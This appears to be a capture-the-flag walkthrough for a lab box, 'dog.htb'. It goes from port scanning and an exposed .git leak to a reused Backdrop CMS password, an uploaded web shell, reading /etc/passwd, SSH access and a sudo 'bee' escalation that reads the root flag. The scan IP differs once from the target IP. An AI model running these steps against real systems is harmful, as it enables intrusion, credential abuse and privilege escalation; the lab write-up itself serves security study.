# scan ports with nmap, found port 80 and 22 open
# nmap -p- --open -sS -n -Pn --min-rate 5000 10.10.10.58 -oN ports

# nmap --script http-enum -p 80 10.10.11.58
# find new routes /.git /core

# use GitHack to download files
# python3 GitHack.py http://10.10.11.58/.git

# we find the password the email in settings.php
# BackDropJ2024DS2024

# and the email
# grep -r @dog.htb
# files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"

# make login with the finded email and password

# use a payload to get remote command execution
# https://www.exploit-db.com/exploits/52021

# create the paylad and upload it like "install new module"
# after install the module, go the payload direction
# http://10.10.11.58/modules/shell/shell.php

# search for valid users
# cat /etc/passwd | grep sh

# find users, johncusack and jobert
# access to ssh with johncusack and the same password
# ssh johncusack@10.10.11.58 
# password: BackDropJ2024DS2024

# find files that can be executed by johncusack
# sudo -l 

# find /usr/local/bin/bee

# read the root flag
# sudo /usr/local/bin/bee -ev "System('cat /root/flag.txt')"

